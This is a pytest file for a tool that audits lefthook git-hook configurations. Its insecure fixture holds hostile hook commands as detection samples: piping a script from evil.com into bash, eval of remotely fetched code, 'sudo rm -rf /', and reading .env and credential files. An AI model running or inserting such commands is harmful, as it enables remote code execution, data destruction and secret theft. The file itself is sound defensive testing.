"""Tests for LefthookAnalyzer."""

from pathlib import Path

from devai.lefthook_analyzer import LefthookAnalyzer, LefthookFinding


INSECURE_LEFTHOOK = """\
min_version: 1.6.0

extends:
  - https://raw.githubusercontent.com/evil/repo/main/lefthook.yml

remote:
  ref: main
  config: lefthook.yml

pre-commit:
  skip: true
  env:
    API_KEY: hardcoded-secret-token-12345
    DATABASE_PASSWORD: leaked-db-password
  commands:
    deploy:
      run: curl http://evil.com/install.sh | bash
    cleanup:
      run: sudo rm -rf /
    perms:
      run: chmod 777 /tmp
    push:
      run: git push origin main --force
    hook:
      run: eval "$(curl http://evil.com/hook.sh)"
    fetch:
      run: curl --insecure https://example.com
    tls:
      run: export GIT_SSL_NO_VERIFY=1
    secrets:
      run: cat .env && cat credentials.json
"""

HARDENED_LEFTHOOK = """\
min_version: 1.6.0

pre-commit:
  parallel: true
  commands:
    lint:
      run: ruff check src tests
    test:
      run: python -m pytest -q

pre-push:
  commands:
    typecheck:
      run: mypy src
"""


class TestLefthookAnalyzer:
    def test_detects_insecure_lefthook(self, tmp_path: Path):
        (tmp_path / "lefthook.yml").write_text(INSECURE_LEFTHOOK, encoding="utf-8")
        analyzer = LefthookAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "destructive_rm" in kinds
        assert "sudo_usage" in kinds
        assert "chmod_777" in kinds
        assert "force_push" in kinds
        assert "eval_usage" in kinds
        assert "insecure_http" in kinds
        assert "tls_verify_disabled" in kinds
        assert "dangerous_shell" in kinds
        assert "sensitive_path" in kinds
        assert "remote_extend" in kinds
        assert "remote_config" in kinds
        assert "skip_all_hooks" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_lefthook_passes(self, tmp_path: Path):
        (tmp_path / "lefthook.yml").write_text(HARDENED_LEFTHOOK, encoding="utf-8")
        analyzer = LefthookAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert not high
        assert analyzer.health_score() >= 90.0

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = LefthookAnalyzer(str(tmp_path))
        assert analyzer.config_files() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_finding_format(self):
        finding = LefthookFinding(
            kind="curl_pipe_shell",
            severity="high",
            message="piping curl/wget to shell is unsafe in git hooks",
            path="lefthook.yml",
            lineno=12,
            line="run: curl http://evil.com | bash",
        )
        assert "[high]" in finding.format()
        assert "lefthook.yml:12" in finding.format()

    def test_detects_yaml_variant(self, tmp_path: Path):
        (tmp_path / "lefthook.yaml").write_text(HARDENED_LEFTHOOK, encoding="utf-8")
        analyzer = LefthookAnalyzer(str(tmp_path))
        assert len(analyzer.config_files()) == 1
        assert analyzer.stats.config_files == 1

    def test_parses_hook_metadata(self, tmp_path: Path):
        (tmp_path / "lefthook.yml").write_text(HARDENED_LEFTHOOK, encoding="utf-8")
        analyzer = LefthookAnalyzer(str(tmp_path))
        analyzer.analyze()
        info = analyzer.infos[0]
        assert "pre-commit" in info.hooks
        assert "pre-push" in info.hooks
        assert "lint" in info.commands
        assert "test" in info.commands

    def test_to_context_includes_summary(self, tmp_path: Path):
        (tmp_path / "lefthook.yml").write_text(HARDENED_LEFTHOOK, encoding="utf-8")
        analyzer = LefthookAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Lefthook analysis:" in context
        assert "health score:" in context

    def test_generate_hardened_template(self):
        analyzer = LefthookAnalyzer(".")
        template = analyzer.generate_hardened_template()
        assert "min_version:" in template
        assert "pre-commit:" in template

    def test_facade_integration(self):
        from devai import DevAI

        ai = DevAI.mock()
        analyzer = ai.lefthook(".")
        assert isinstance(analyzer, LefthookAnalyzer)

    def test_public_api_exports(self):
        from devai import (
            LefthookAnalyzer,
            LefthookFinding,
            LefthookInfo,
            LefthookStats,
        )

        assert LefthookAnalyzer is not None
        assert LefthookFinding is not None
        assert LefthookInfo is not None
        assert LefthookStats is not None
